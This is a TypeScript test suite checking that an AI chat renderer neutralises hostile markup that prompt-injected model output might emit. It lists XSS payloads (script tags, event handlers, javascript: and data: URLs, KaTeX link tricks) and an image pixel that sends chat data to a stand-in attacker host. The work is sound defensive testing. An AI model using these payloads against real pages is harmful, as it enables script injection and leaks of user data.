/**
 * Part 2B (AI Lab): model output is untrusted (prompt injection can make the model emit anything), so the
 * assistant renderer must never produce executable markup, script-capable URLs or third-party requests.
 * Rendered through the real ChatMessageContent (react-markdown + remark-math + rehype-katex + rehype-sanitize).
 */
import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { ChatMessageContent } from "@/components/ai/ChatMessageContent";

const PAYLOADS: Array<[string, string]> = [
  ["raw <script>", "<script>window.__pwned = 1</script>hello"],
  ["raw <img onerror>", '<img src="x" onerror="window.__pwned=1">'],
  ["raw <svg onload>", '<svg onload="window.__pwned=1"></svg>'],
  ["raw <iframe>", '<iframe src="https://evil.example"></iframe>'],
  ["raw <a href=javascript:>", '<a href="javascript:window.__pwned=1">x</a>'],
  ["markdown link javascript:", "[click](javascript:window.__pwned=1)"],
  ["markdown link JaVaScRiPt: with entities", "[click](JaVa&#x09;ScRiPt:alert(1))"],
  ["markdown link data:", "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"],
  ["markdown link vbscript:", "[click](vbscript:msgbox(1))"],
  ["autolink javascript:", "<javascript:alert(1)>"],
  ["reference link javascript:", "[x][r]\n\n[r]: javascript:alert(1)"],
  ["markdown image javascript:", "![x](javascript:alert(1))"],
  ["markdown image to a third party (tracking / exfiltration)", "![pixel](https://evil.example/p.gif?leak=chat)"],
  ["KaTeX \\href javascript:", "$\\href{javascript:alert(1)}{click}$"],
  ["KaTeX \\url", "$\\url{javascript:alert(1)}$"],
  ["KaTeX \\htmlStyle / \\htmlClass", "$\\htmlStyle{background:url(https://evil.example)}{x}\\htmlClass{x}{y}$"],
  ["HTML in a code fence", "```html\n<script>window.__pwned=1</script>\n```"],
  ["style element", "<style>body{display:none}</style>"],
  ["form element", '<form action="https://evil.example"><input name="p"></form>'],
];

function assertInert(container: HTMLElement) {
  expect(container.querySelectorAll("script, iframe, object, embed, style, form, input, base, meta, link")).toHaveLength(0);
  for (const el of Array.from(container.querySelectorAll("*"))) {
    for (const attr of Array.from(el.attributes)) {
      expect(attr.name, `${el.tagName} ${attr.name}`).not.toMatch(/^on/i);
      expect(attr.value, `${el.tagName} ${attr.name}`).not.toMatch(/^\s*(javascript|vbscript|data):/i);
      if (attr.name === "style") expect(attr.value).not.toMatch(/url\(/i);
    }
  }
  for (const a of Array.from(container.querySelectorAll("a"))) {
    expect(a.getAttribute("href")).toMatch(/^https?:\/\//);
    expect(a.getAttribute("rel")).toContain("noopener");
  }
  // No request leaves the page because of model output (no remote images).
  expect(container.querySelectorAll("img")).toHaveLength(0);
  expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
}

describe("assistant output rendering is inert", () => {
  it.each(PAYLOADS)("%s", (_label, payload) => {
    const { container } = render(<ChatMessageContent content={payload} />);
    assertInert(container);
  });

  it("ordinary https links still work, open in a new tab without opener", () => {
    const { container } = render(<ChatMessageContent content="See [PubChem](https://pubchem.ncbi.nlm.nih.gov/)." />);
    const a = container.querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://pubchem.ncbi.nlm.nih.gov/");
    expect(a.getAttribute("target")).toBe("_blank");
    expect(a.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("a model-named image is a link the user may choose to follow, never loaded (SEC-15)", () => {
    const { container } = render(<ChatMessageContent content="![benzene ring](https://upload.example/benzene.png)" />);
    expect(container.querySelector("img")).toBeNull();
    const a = container.querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://upload.example/benzene.png");
    expect(a.textContent).toBe("[image: benzene ring]");
  });

  it("text, emphasis, lists, code and math still render", () => {
    const { container } = render(<ChatMessageContent content={"**Benzene** is `C6H6`:\n\n- aromatic\n- planar\n\n$E = mc^2$"} />);
    expect(container.querySelector("strong")?.textContent).toBe("Benzene");
    expect(container.querySelector("code")?.textContent).toBe("C6H6");
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.textContent).toContain("E");
  });

  it("user messages are plain text, never parsed", () => {
    const { container } = render(<ChatMessageContent variant="user" content={'<img src=x onerror="window.__pwned=1"> **bold**'} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("<img src=x");
    expect(container.querySelector("strong")).toBeNull();
  });
});
